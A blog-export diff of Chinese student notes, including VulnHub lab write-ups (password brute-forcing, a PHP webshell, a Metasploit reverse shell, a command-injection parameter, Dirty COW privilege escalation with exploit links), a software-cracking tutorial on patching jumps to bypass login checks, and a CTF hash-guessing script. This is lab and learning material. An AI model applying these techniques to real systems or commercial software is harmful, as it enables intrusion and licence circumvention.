+</li>
+<li>地头蛇——半封建半帝国</li>
+<li>白员<ol>
+<li>对潜规则的揭发为威胁夺食</li>
+<li>高级的潜规则——自我反对</li>
+</ol>
+</li>
+</ol>
+<h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><ol>
+<li>天下已定，英雄当烹</li>
+</ol>
+<h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>跟潜规则一书差不多，只是挖掘的更具象</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tommyboy-writeup</title>
+    <url>/2023/12/03/old/tommyboy-writeup/</url>
+    <content><![CDATA[<h1 id="tommyboy-writeup"><a href="#tommyboy-writeup" class="headerlink" title="tommyboy_writeup"></a>tommyboy_writeup</h1><p>这是学校作业</p>
+<span id="more"></span>
+<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
+<p>靶机名：tommyboy 1<br>靶机作者：<a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a><br>靶机链接1：<a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a><br>靶机链接2:<a href="http://7ms.us/tommyboy">http://7ms.us/tommyboy</a><br>目标：5个flag和一个final message</p>
+</blockquote>
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><ol>
+<li>通过robots.txt泄露发现flag1</li>
+</ol>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><ol>
+<li>根据首页源码提示，得到提示链接，知道网站主目录</li>
+<li>浏览主目录的posts，发现一篇post的回复包含了flag2存放在什么文件的信息</li>
+</ol>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><ol>
+<li>根据主目录post回复中的提示，了解了一个存放图片的网站目录</li>
+<li>下载图片，用strings查看，发现了一串密文(一般有一定规律性，让人觉得很规整但看不懂的就是密文)</li>
+<li>通过在线md5工具解密该密文，得到一个单词</li>
+<li>用该单词作为网站主目录第二篇post的密码，成功访问该post内容</li>
+<li>根据该post提示，了解了靶机有一诡异的ftp服务，通过nmap不断扫描，直到发现多处来一个开放端口</li>
+<li>通过hydra爆破该服务密码，用户名根据post提示已经知道(记得将用户名添加到字典的第一行)</li>
+<li>爆破成功后登入ftp服务</li>
+<li>得到提示文本，发现一新目录，但是没讲具体位置，最后在8008端口的web服务上访问到该目录</li>
+<li>访问目录的回显提示，只有他和steve jobs可以访问其中的内容，通过脑洞猜测，试出来修改UA为iphone就能访问内容(脑洞什么根本没有的，只有抄的份)</li>
+<li>提示需要猜测网站正确的网页名，通过爆破得到网页名，我用的dirbuster(爆破不了一点，100线程就崩了，所以还是抄的)</li>
+<li>访问到网站网页，得到flag3和一hint，同时还有一个加密文件</li>
+</ol>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><ol>
+<li>根据hint中的提示，生成密码字典，我用的crunch</li>
+<li>用fcrackzip爆破成功得到3对用户名和密码，以及一个没有密码的用户名(错的)(前两对密码p用没有，第三对据hint是server的用户名和密码)</li>
+<li>通过wpscan扫描网站的用户</li>
+<li>对tom用户进行密码爆破，字典是rockyou，用wpscan爆破</li>
+<li>访问网站后台，在draft中得到密码提示，与hint中的第三对用户名密码拼接，通过ssh成功得到靶机shell</li>
+<li>ls发现了flag4</li>
+</ol>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><ol>
+<li>根据提示，在靶机根目录发.5.txt</li>
+<li>由于5.txt需要www-data权限，需要通过webshell来获得该权限，所以在&#x2F;var目录下查找网站根目录(由于有两个http端口，所以有两个根目录)</li>
+<li>发现可以在&#x2F;var&#x2F;thatsg0nnaleaveamark&#x2F;NickIzL33t&#x2F;P4TCH_4D4MS&#x2F;uploads写入webshell</li>
+<li>写入一句话木马，通过浏览器直接访问，用该webshell查看.5.txt内容</li>
+<li>拼接5个flag，解压loot.zip，通关该靶场</li>
+</ol>
+<h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><ol>
+<li>上传linpeas脚本探测，得知多种提权方式</li>
+<li>使用脏牛脚本提权</li>
+</ol>
+<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
+<p>robots.txt文件泄露<br>strings解插入隐写<br>hackbar修改User-agent<br>dirbuster网页名爆破<br>crunch密码生成器<br>fcrackzip zip密码爆破工具<br>wpscan(wordpress cms框架扫描器)扫描后台用户名和密码爆破<br>通过webshell获取www-data权限<br>linpeas linux提权漏洞扫描脚本<br>脏牛提权</p>
+</blockquote>
+<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络情况<br><img src="/2023/12/03/old/tommyboy-writeup/11%E7%BD%91%E7%BB%9C%E6%83%85%E5%86%B5.png"><br>robots.txt文件泄露发现的flag1<br><img src="/2023/12/03/old/tommyboy-writeup/12flag1.png"><br>首页源码提示<br><img src="/2023/12/03/old/tommyboy-writeup/13%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA1.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/14%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA2.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/15%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E7%BF%BB%E8%AF%91.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/16%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA%E6%8C%87%E5%90%91%E9%93%BE%E6%8E%A5.png"><br>最终找到了网站主目录<br><img src="/2023/12/03/old/tommyboy-writeup/17%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%811.png"><br>发现新的网站目录<br><img src="/2023/12/03/old/tommyboy-writeup/18%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86for%E5%9B%BE%E7%89%87%E5%AF%86%E7%A0%812.png"><br>发现flag2<br><img src="/2023/12/03/old/tommyboy-writeup/19flag2.png"><br>发现图片，发现插入隐写<br><img src="/2023/12/03/old/tommyboy-writeup/21.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/22.png"><br>得到密码，解锁并查看第二篇post<br><img src="/2023/12/03/old/tommyboy-writeup/23.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/24%E5%85%A8%E6%96%87.png"><br>发现神必ftp端口<br><img src="/2023/12/03/old/tommyboy-writeup/25ftp%E7%AB%AF%E5%8F%A3.png"></p>
+<p>爆破ftp账号</p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/27%E5%B0%86%E7%94%A8%E6%88%B7%E5%90%8D%E6%94%BE%E5%9C%A8%E5%AD%97%E5%85%B8%E5%89%8D%E9%9D%A2.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/28%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"><br>发现ftp服务存放的提示文本<br><img src="/2023/12/03/old/tommyboy-writeup/26%E4%B8%8B%E8%BD%BDreadme.png"><br><img src="/2023/12/03/old/tommyboy-writeup/29%E5%BE%97%E5%88%B0%E6%96%B0%E7%9B%AE%E5%BD%95.png"><br>发现8008网站的目录，根据提示修改UA，并爆破网页名<br><img src="/2023/12/03/old/tommyboy-writeup/31%E8%AE%BF%E9%97%AE%E5%88%B0%E7%9B%AE%E5%BD%95.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/32%E6%9B%B4%E6%94%B9useragent%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/33%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B41.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/34%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B42.png"><br>得到flag3和hint<br><img src="/2023/12/03/old/tommyboy-writeup/35flag3+hint.png"><br>爆破backups密码<br><img src="/2023/12/03/old/tommyboy-writeup/36%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/37tommyboy%E4%B8%8A%E7%BA%BF%E6%97%B6%E9%97%B4.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/38%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/39%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/41%E8%A7%A3%E5%8E%8B.png"><br>得到提示<br><img src="/2023/12/03/old/tommyboy-writeup/42%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>wpscan扫描爆破网站后台<br><img src="/2023/12/03/old/tommyboy-writeup/43%E9%80%9A%E8%BF%87wpscan%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/44%E7%88%86%E7%A0%B4%E5%87%BA%E5%AF%86%E7%A0%81.png"><br>登陆后台查看draft<br><img src="/2023/12/03/old/tommyboy-writeup/45%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/46%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%8F%90%E7%A4%BA.png"><br>根据hint和draft提示，ssh连接靶机<br><img src="/2023/12/03/old/tommyboy-writeup/47ssh%E7%99%BB%E9%99%86.png"><br>查看flag4<br><img src="/2023/12/03/old/tommyboy-writeup/48flag4+%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>找到flag5<br><img src="/2023/12/03/old/tommyboy-writeup/49%E5%8F%91%E7%8E%B0flag5.png"><br>写webshell，获得www-data权限<br><img src="/2023/12/03/old/tommyboy-writeup/50%E5%88%B6%E4%BD%9Cwebshell.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/51%E9%80%9A%E8%BF%87webshell%E8%AF%BB%E5%8F%96flag5.png"><br>提权<br><img src="/2023/12/03/old/tommyboy-writeup/52%E9%80%9A%E8%BF%87linspea%E8%84%9A%E6%9C%AC%E6%8E%A2%E6%B5%8B%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/53%E8%8E%B7%E5%8F%9640616.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/54%E6%8F%90%E6%9D%83.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/55theend.png"><br>flag2和3<br><img src="/2023/12/03/old/tommyboy-writeup/flag2.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/flag3.png"></p>
+<p><img src="/2023/12/03/old/tommyboy-writeup/%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC%E6%B1%87%E6%80%BB.txt"></p>
+<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
+<li>dirbuster以前没用过，不过图形化什么的确实挺方便</li>
+<li>linpeas这个脚本，功能十分强大</li>
+<li>脑洞不够，鬼知道stevejobs要改iphone，不过我想，可以讲所有苹果产品的UA搜集起来做成字典，用burpsuite爆破</li>
+<li>这个靶机，getroot是非必要的</li>
+<li>脏牛提权后不久，靶机就会死机，不知道其他提权方法会不会这样</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
+<p>学校给的ppt<br><a href="https://www.cnblogs.com/cute/p/16331359.html">https://www.cnblogs.com/cute/p/16331359.html</a> linpeas脚本介绍<br><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a> linpeas github库<br><a href="https://www.exploit-db.com/exploits/40616">https://www.exploit-db.com/exploits/40616</a> 脏牛提权exp脚本</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wallabysnightmare102-writeup</title>
+    <url>/2023/11/24/old/wallabysnightmare102-writeup/</url>
+    <content><![CDATA[<h1 id="wallabysnightmare102-writeup"><a href="#wallabysnightmare102-writeup" class="headerlink" title="wallabysnightmare102_writeup"></a>wallabysnightmare102_writeup</h1><p>这是学校作业</p>
+<span id="more"></span>
+<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
+<p>靶机名：wallabysnightmare102<br>靶机链接：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a><br>作者博客：<a href="https://www.arashparsa.com/">https://www.arashparsa.com/</a></p>
+</blockquote>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol>
+<li>80端口web服务</li>
+<li>使用nikto扫描漏洞后会关闭80端口，并吧网站转移到60080端口</li>
+</ol>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
+<li>发现page参数具有目录穿越漏洞</li>
+<li>nikto扫描该参数</li>
+<li>80端口关闭，继续扫描60080端口的page参数</li>
+<li>发现了&#x2F;?page&#x3D;mailer网页注释</li>
+<li>发现&#x2F;?page&#x3D;mailer&amp;mail&#x3D;ls命令执行漏洞</li>
+<li>通过metasploit获取php reverse shell</li>
+</ol>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li>根据内核版本，上传脏牛提权漏洞 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></li>
+<li>getroot</li>
+</ol>
+<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
+<p>[[nikto]] web 漏洞扫描工具<br>metasploit 获取反弹shell用<br><code>python3 -m http.server 8081</code> 开启简易web网站，用于上传提权脚本</p>
+</blockquote>
+<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol>
+<li>端口扫描<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/1.png"></li>
+<li>浏览网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/2.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/3.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/4.png"></li>
+<li>发现目录穿越漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/5.png"></li>
+<li>通过nikto进行漏洞扫描，但是扫到一半超时了<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/6.png"></li>
+<li>发现开启了新端口<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/7.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/8.png"></li>
+<li>访问网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/9.png"></li>
+<li>发现网站仍然有page参数<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/10.png"></li>
+<li>遍历page参数值<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/11.png"></li>
+<li>发现mailer有命令执行漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/12.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/13.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/14.png"></li>
+<li>远程连接<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/15.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/16.png"></li>
+<li>上传提权脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/17.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/18.png"></li>
+<li>编译脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/19.png"></li>
+<li>getshell<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/20.png"></li>
+</ol>
+<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
+<li>要善于使用工具，发挥工具的最大功用；当然，弄清楚原理、学的深入是最重要的</li>
+<li>metasploit是一个功能强大的软件，这意味着要学习如何使用也是很花时间的，这也是确实是未来需要花的</li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
+<p>学校给的资料<br>提权脚本 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>看图识地点</title>
+    <url>/2023/11/05/old/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这是一个极度简单普通的技术，但其揭示并隐含着通向一条知识的大道<br>这篇文章本身也是极度简陋的，会时不时更新</p>
+<h1 id="训练处"><a href="#训练处" class="headerlink" title="训练处"></a>训练处</h1><p>(暂时不知道有什么比赛)</p>
+<ol>
+<li><a href="https://ctf.show/">https://ctf.show</a> 其中的网络迷踪里的题目很多很有趣，尽管csdn近乎毁了其中的乐趣，不过技术还是值得学习的</li>
+<li><a href="https://www.geoguessr.com/">https://www.geoguessr.com</a> 根据某地的360度图猜地点的游戏</li>
+</ol>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>百度识图<br>搜狗识图<br>google识图 lens.google.com<br>yandox识图 yandox.com&#x2F;images</p>
+<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>得到一张图片，通常要获得该图片所在地址，难一点就是拍摄时间</p>
+<ol>
+<li>识图工具找到图片来源或者以图搜图的找线索</li>
+<li>找的到或找不到，这都是有可能的</li>
 </ol>
 ]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>社会工程学</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wanwan破解-心得</title>
+    <url>/2024/08/04/wanwan%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<p>这是吾爱破解上的软件破解入门教程, <a href="https://www.52pojie.cn/thread-1358649-1-1.html">https://www.52pojie.cn/thread-1358649-1-1.html</a><br>浅尝辄止了一下,记录一点小小的收获</p>
+<p>软件破解是逆向工程的一个分支,是绕过软件创作者的使用限制的技术<br>要破解的有两个方面:</p>
+<ol>
+<li>注册验证</li>
+<li>反调试</li>
+</ol>
+<h1 id="注册验证"><a href="#注册验证" class="headerlink" title="注册验证"></a>注册验证</h1><p>也就是向软件证明自己的身份,来告诉创作者:我是付过钱的</p>
+<p>验证方法有:本地验证和网络验证<br>本地验证又有:</p>
+<ol>
+<li>重启验证:注册不过期,例如使用注册码后,软件在注册表创建“已注册”的标志,每次软件打开都会先读取一次注册表</li>
+<li>非重启验证:注册会过期,例如账号密码验证,每次重启软件都要重新输入账号密码</li>
+</ol>
+<p>这套教程只讲解本地验证的破解方法</p>
+<h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><p>其手段大致四类:</p>
+<ol>
+<li>通过环境查看手段,判断是否有调试器打开,例如看进程</li>
+<li>对用户正在使用调试器的行为进行动态识别,是不是正在用调试器对软件进行调试和修改</li>
+<li>对软件完整性进行检测,例如把加壳后的软件解壳,软件的体积和内容发生更改后,会被检测到</li>
+<li>干扰处理:就是让你看不懂,加壳、加花、虚拟化代码</li>
+</ol>
+<h1 id="如何破解"><a href="#如何破解" class="headerlink" title="如何破解?"></a>如何破解?</h1><p>用反汇编器和调试器下断点,找关键代码,并进行适当的修改——打补丁<br>常用的工具例如ida和ollydbg<br>然后,要用吾爱破解专用ollydbg,因为有插件</p>
+<h2 id="怎么下断点"><a href="#怎么下断点" class="headerlink" title="怎么下断点?"></a>怎么下断点?</h2><ol>
+<li>关键字<br>软件的内容分为指令和数据,在指令和数据区搜索“登录失败”之类的关键词就能锁定关键代码的位置</li>
+<li>api<br>通常软件的弹窗、按钮等的功能都是对系统api的调用,而不是软件开发者花时间自己的写的<br>搜索对应的api,下断点<br>动态调试这个软件<br>就能找打关键指令的位置</li>
+</ol>
+<h2 id="找到关键指令了-下一步-打补丁"><a href="#找到关键指令了-下一步-打补丁" class="headerlink" title="找到关键指令了,下一步?打补丁"></a>找到关键指令了,下一步?打补丁</h2><p>阅读它,你需要能看懂汇编代码,你需要了解寄存器,你需要着重学习push、pop、call、ret、jmp和各种变体指令,如果你能懂call stack就更好了<br>PS: call stack 这个wanwan破解并没有教,如果你感兴趣,你可以穿越到几个月前访问begin.re学习这个知识,它下架了:(</p>
+<p>假如这是个要本地登录的软件<br>你可能看指令的时候,看到“登录成功”和“登录失败”的弹窗指令,它们挨的很近<br>你只需要找到附近的je指令(也可能是jle或jge)改成jmp,跳过“登录失败”的弹窗指令,来到“登录成功”的指令</p>
+<p>这会导致什么结果呢?你怎么登录都会显示“登录成功”,因为你无法“登录失败”</p>
+<h1 id="总之"><a href="#总之" class="headerlink" title="总之"></a>总之</h1><p>破解的流程是:<br>找关键代码》分析〉跳过失败的指令》破解成功</p>
+<p>我不太想在软件破解上更进一步,卖破解软件是要吃牢饭的</p>
+]]></content>
+      <categories>
+        <category>逆向工程</category>
+        <category>软件破解</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逆向之什么是int 80h</title>
+    <url>/2024/08/10/int-80h/</url>
+    <content><![CDATA[<p><a href="https://0xinfection.github.io/reversing/pages/part-22-asm-program-1-moving-immediate-data.html">https://0xinfection.github.io/reversing/pages/part-22-asm-program-1-moving-immediate-data.html</a></p>
+<p>虽然文章给了很多信息,但对某些核心的要点表述太多,还好我有文心一言</p>
+<h1 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h1><p>linux系统的内存空间分为:USER SPACE 和 LINUX KERNEL SPACE</p>
+<p>其中,汇编产生的程序,其运行时的内容都在USER SPACE,int 80h在这里出现</p>
+<h1 id="其工作流程是"><a href="#其工作流程是" class="headerlink" title="其工作流程是:"></a>其工作流程是:</h1><ol>
+<li>准备参数:<ol>
+<li><code>%eax</code>寄存器：用于存放系统调用号，即要执行的系统调用的唯一标识符。</li>
+<li><code>%ebx</code>、<code>%ecx</code>、<code>%edx</code>等寄存器：用于按顺序存放系统调用所需的参数。对于需要超过三个参数的系统调用，可能还会使用<code>%esi</code>、<code>%edi</code>和<code>%ebp</code>寄存器，或者在内存中分配空间并通过寄存器传递指向该空间的指针。</li>
+</ol>
+</li>
+<li>保存上下文,例如USERSPACE里的下一条指令,FLAGS和重要的寄存器数据,它们都会推送到栈里</li>
+<li>跳转到中断描述符表（IDT）(或者中断向量符表)的第0x80项:中断服务例程（ISR）(下面有解释👇)</li>
+<li>根据寄存器的内容,执行特定的系统调用</li>
+<li>执行完之后,从内核态转到用户态 这个过程叫IRET</li>
+<li>pop被保存的上下文,即来到int80h下的第一条指令</li>
+</ol>
+<h1 id="中断向量符表"><a href="#中断向量符表" class="headerlink" title="中断向量符表"></a>中断向量符表</h1><p>Interrupt Descriptor Table</p>
+<p>其前身(不确定)Interrupt Vector Table</p>
+<p>在内存的最底部,段地址和偏移地址都为0的地方,存在名为Interrupt Vector Table的数据结构<br>其包含256个条目,每个条目有4bytes,每个条目都是一个内存地址称为中断向量</p>
+<p>其中第0x80项:中断服务例程（ISR）会读取<code>%eax</code>寄存器中的系统调用号，并根据该号码查找并调用相应的系统调用处理函数</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>int 80h是进行系统调用的方法</p>
+]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>how-to-correct-grammar-effectively</title>
+    <url>/2024/08/05/how-to-correct-grammar-effectively/</url>
+    <content><![CDATA[<p><a href="https://www.youtube.com/watch?v=A5uz6LWeLPM">https://www.youtube.com/watch?v=A5uz6LWeLPM</a></p>
+<p>磨听力时看到的视频,讲了如何学习英语语法并有效寻找纠正语法错误的方法</p>
+<p>这分为一下几个步骤:</p>
+<ol>
+<li>找出语法错误和弱项</li>
+<li>确认问题属于:form or function  (用法错误还是压根不认识不会用)</li>
+<li>制作template 把句型提取出来 用n种方式补全 (I haven’t ··· yet today )</li>
+</ol>
+<p>关于步骤一,平时没有积累,不知道弱项怎么办的?<br>网上找篇文章,读个2-3遍,用自己的英语写一遍,丢给AI</p>
+]]></content>
+      <categories>
+        <category>英语</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>basectf_week1_wp</title>
+    <url>/2024/08/18/basectf-week1-wp/</url>
+    <content><![CDATA[<p>misc部分基本都空着,如果也想要wp,请问<a href="https://maonie.top/">https://maonie.top/</a><br>basectf官网:basectf.fun<br>这是week1的wp</p>
+<span id="more"></span>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week1-你也喜欢圣物吗"><a href="#Week1-你也喜欢圣物吗" class="headerlink" title="[Week1] 你也喜欢圣物吗"></a>[Week1] 你也喜欢圣物吗</h2><h2 id="Week1-根本进不去啊"><a href="#Week1-根本进不去啊" class="headerlink" title="[Week1] 根本进不去啊!"></a>[Week1] 根本进不去啊!</h2><h2 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h2><h2 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a><strong>[Week1] 正着看还是反着看呢？</strong></h2><h2 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h2><h2 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h2><p>总之就是一个条件一个条件的掰flag<br>最后better个be部分没提示了,但是有hash爆破<br>BaseCTF{s1Mpl3_1s_??Tt3r_Th4n_C0mPl3x}<br>我不记得是猜Be还是用下面的exp爆的,这题做的我昏过去了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">import itertools  </span><br><span class="line">  </span><br><span class="line"># 给定的flag模板和哈希值  </span><br><span class="line">flag_template = &#x27;BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;&#x27;  </span><br><span class="line">target_hash = &#x27;e40075055f34f88993f47efb3429bd0e44a7f479&#x27;  </span><br><span class="line">  </span><br><span class="line"># 可能的字符集（这里假设是小写字母和数字）  </span><br><span class="line">charset = &#x27;QAZWSXEDCRFVTGBYHNUJMIKLOPabcdefghijklmnopqrstuvwxyz0123456789&#x27;  </span><br><span class="line">  </span><br><span class="line"># 遍历所有可能的两个字符组合  </span><br><span class="line">for chars in itertools.product(charset, charset):  </span><br><span class="line">    # 生成当前尝试的flag  </span><br><span class="line">    current_flag = flag_template.replace(&#x27;??&#x27;, &#x27;&#x27;.join(chars))  </span><br><span class="line">    # 计算当前flag的SHA-1哈希值  </span><br><span class="line">    current_hash = hashlib.sha1(current_flag.encode()).hexdigest()  </span><br><span class="line">    # 检查哈希值是否匹配  </span><br><span class="line">    print(current_hash)</span><br><span class="line">    if current_hash == target_hash:  </span><br><span class="line">        print(f&quot;找到匹配的flag: &#123;current_flag&#125;&quot;)  </span><br><span class="line">        break  # 找到匹配项后退出循环  </span><br><span class="line">else:  </span><br><span class="line">    print(&quot;没有找到匹配的flag&quot;)</span><br></pre></td></tr></table></figure>
+
